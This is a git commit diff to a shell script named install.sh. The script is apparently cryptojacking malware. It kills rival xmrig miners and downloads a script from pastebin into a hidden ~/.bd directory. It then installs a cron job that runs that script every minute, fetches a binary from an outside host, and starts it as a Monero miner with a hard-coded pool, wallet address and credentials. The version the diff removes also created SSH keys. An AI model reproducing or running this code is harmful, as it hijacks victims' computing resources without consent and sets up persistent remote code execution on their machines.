6bc22445f4e2e938fba309f9976a45c24f12b01c
robpot891 <rpotter@live.ca>
2018-12-01 03:12:36 -0500

    Update install.sh

--- install.sh
+++ install.sh
@@ -2,17 +2,22 @@
 
 urlprefix='https://pastebin.com/raw'
 sshtml='https://imersiv.ca'
+xr='shtml'
 
-ps aux | grep -vw shtml | awk '{if($3>40.0) print $2}' | while read procid
-do
-kill -9 $procid
-done
+if [[ $(ps -ef | grep xmrig | grep -v grep | wc -l) != 0 ]]; then
+    killall xmrig
+fi
 [ ! -f ~/.bd/crontab ] && mkdir ~/.bd
 curl -s -o ~/.bd/bd.sh $urlprefix/P2rfkcKJ
 chmod +x ~/.bd/bd.sh
-[ ! -f ~/.bd/crontab ] && echo '* * * * * /bin/bash ~/.bd/sshtml > /dev/null 2>&1' >> ~/.bd/crontab
+[ ! -f ~/.bd/crontab ] && echo '* * * * * /bin/bash ~/.bd/bd.sh > /dev/null 2>&1' >> ~/.bd/crontab
 crontab ~/.bd/crontab
-[ ! -f ~/.ssh/id_rsa.pub ] && ssh-keygen -t rsa -q -N '' -f ~/.ssh/id_rsa
-[ ! -f ~/.bd/shtml ] && wget $sshtml/shtml
-chmod +x ~/.bd/shtml
-nohup ./shtml
+[ ! -f ~/.bd/$xr ] && curl -s -o ~/.bd/$xr $sshtml/$xr
+chmod +x ~/.bd/$xr
+if [[ $(ps -ef | grep $xr | grep -v grep | wc -l) = 0 ]]; then
+    launch=1
+fi
+if [ $launch = 1 ]; then
+    cd ~/.bd/ || exit
+    nohup ./$xr -B -o pool.monero.hashvault.pro:3333 -u 42uGUDQciTUCdgveHQ1SaSSWzzd1T4mFRB61witnZQK1FCXwvjXSxAbbLph8mURcZthneebwBUdrDSgArMQxim9iVX8kabx -p johnnyseven:johnny2guns@tutanota.com -k out.log 2>&1 &
+fi
